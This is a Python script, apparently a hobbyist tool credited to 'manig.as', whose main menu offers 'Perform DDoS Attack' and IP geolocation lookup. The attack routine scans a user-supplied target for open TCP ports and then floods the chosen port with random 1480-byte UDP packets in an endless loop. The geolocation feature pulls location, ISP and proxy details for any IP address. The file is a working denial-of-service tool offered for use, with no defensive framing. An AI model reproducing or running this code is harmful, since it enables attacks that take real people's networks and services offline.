import socket
import threading
import os
import sys
import random
import ctypes
import time
import requests
import fade  
import colorama
from colorama import Fore, Style

delay = 20
psc = 5000
ux = 3
port = 1
sent = 0
id = 1
svc = []
bytes = random._urandom(1480)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if os.name == 'nt':
    os.system('color b')
    os.system('SL-TOOL') 
else:
    os.system('setterm -background white -foreground white -store')

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def TCP_connect(ipp, port_number, delay, output):
    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(delay)
    try:
        TCPsock.connect((ipp, port_number))
        output[port_number] = 'Listening'
    except:
        output[port_number] = ''

def scan_ports(ipp, delay):
    threads = []
    output = {}

    for i in range(psc):
        t = threading.Thread(target=TCP_connect, args=(ipp, i, delay, output))
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    for i in range(psc):
        if output[i] == 'Listening':
            svc.append(int(i))

def main_menu():
    cls()
    print(fade.fire("""
  ██████  ██▓       ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▒██    ▒ ▓██▒       ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
░ ▓██▄   ▒██░  ████ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
  ▒   ██▒▒██░       ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
▒██████▒▒░██████▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
░ ░▒  ░ ░░ ░ ▒  ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
░  ░  ░    ░ ░        ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
      ░      ░  ░                ░ ░      ░ ░      ░  ░
By: manig.as
Note:Discord manig.as Write if there is an error
"""))

    input("\nPress Enter to continue...\n")

    while True:
        cls()
        print("1. Perform DDoS Attack")
        print("2. IP Information Lookup")
        print("3. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            attack_menu()
        elif choice == '2':
            ip_info_lookup()
        elif choice == '3':
            print("Exiting...")
            sys.exit()
        else:
            print("Invalid choice. Please try again.")
            time.sleep(1)

def ip_info_lookup():
    cls()
    print("IP Information Lookup\n")
    print("1. Locate IP Address")
    print("2. Locate Your Own IP Address")
    print("3. Back to Main Menu")

    choice = input("Enter your choice: ")

    if choice == '1':
        locate_ip()
    elif choice == '2':
        locate_own_ip()
    elif choice == '3':
        main_menu()
    else:
        print("Invalid choice. Please try again.")
        time.sleep(1)


def locate_ip():
    cls()
    print(Fore.RED + "Locate IP Address\n" + Style.RESET_ALL)
    ipin = input("Enter IP address: ")
    print(f"Searching data for {ipin} IP address...\n")
    api = f"http://ip-api.com/json/{ipin}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"

    data = requests.get(api).json()
    for key, value in data.items():
        print(Fore.RED + f"{key.capitalize()}: {value}" + Style.RESET_ALL)
    input("\nPress Enter to continue...")
    ip_info_lookup()

def locate_own_ip():
    cls()
    api_own_ip = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"
    data = requests.get(api_own_ip).json()
    for key, value in data.items():
        print(Fore.RED + f"{key.capitalize()}: {value}" + Style.RESET_ALL)
    input("\nPress Enter to continue...")
    ip_info_lookup()

def attack_menu():
    global delay, psc, ux, port, sent, id, svc, bytes

    cls()

    print(fade.fire("""
  ██████  ██▓    ▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██    ▒ ▓██▒    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░ ▓██▄   ▒██░ ██ ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
  ▒   ██▒▒██░    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
▒██████▒▒░██████▒░▒████▓▌░▒████▓▌░ ████▓▒░▒██████▒▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░ ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░░ ░ ▒  ░ ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
░  ░  ░    ░ ░    ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
      ░      ░  ░   ░       ░        ░ ░        ░  
                  ░       ░   
script by:manig.as       
Note:Discord manig.as Write if there is an error                                                                   
    """))

    print("Enter target IP:")
    ip = input(":")
    ipp = ip
    target = ip

    if len(sys.argv) == 2:
        target = socket.gethostbyname(sys.argv[1])

    print("Enter timeout seconds (recommended: 20):")
    delay = int(input(":"))
    print("Enter port scanning sensitivity (recommended: 3):")
    ux = int(input(":"))
    print("Enter port scanning range (recommended: 5000, maximum: 65535):")
    psc = int(input(":"))

    print("Estimated scanning time:", delay * ux + (psc * 0.002), "seconds\n")

    for kk in range(ux):
        scan_ports(ipp, delay)
        print("Phase", kk + 1, "completed\n")

    res = [*set(svc)]
    print("Open ports:", res)

    print("Choose port:")
    open_port = int(input(":"))

    print("Package size (minimum 5000):")
    threads = int(input(":"))
    if threads < 5000:
        sys.exit("Thread size smaller than 5000")

    c = (sent + int(threads / 100) * 100.44) / 500
    sentstring = round(sent, 1)

    if os.name == 'nt':
        print("Check task manager")
    else:
        print("Check the traffic")

    nx = len(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
    print("-" * nx)

    while True:
        for i in range(int(threads / 1000)):
            for j in range(16):
                sock.sendto(bytes, (ipp, open_port))

        print(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
        id += 1
        if id % 100 == 0 or id > 100 and id % 1000 == 0:
            nx = len(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
            print("-" * nx)

if __name__ == "__main__":
    main_menu()
